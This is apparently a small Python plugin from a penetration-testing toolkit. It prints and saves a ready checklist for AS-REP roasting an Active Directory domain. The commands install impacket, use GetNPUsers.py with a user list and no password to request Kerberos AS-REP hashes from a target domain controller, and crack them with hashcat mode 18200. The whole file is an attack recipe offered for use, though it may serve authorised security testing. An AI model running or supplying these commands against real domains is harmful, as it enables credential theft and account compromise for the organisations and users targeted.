"""asreproast — AS-REP roasting checklist (impacket GetNPUsers)"""
from pathlib import Path

class Asreproast:
    def run(self, session, logger):
        steps = [
            "pip install impacket",
            f"GetNPUsers.py DOMAIN/ -dc-ip {session.target} -usersfile users.txt -no-pass -format hashcat",
            f"GetNPUsers.py DOMAIN/ -dc-ip {session.target} -request -no-pass -outputfile asrep.txt",
            "# crack:",
            "hashcat -m 18200 asrep.txt wordlist.txt",
        ]
        print("[asreproast]")
        for s in steps: print(f"  {s}")
        out = Path("reports") / "asreproast_commands.txt"
        out.parent.mkdir(exist_ok=True)
        out.write_text("\n".join(steps))
        return {"steps": steps}
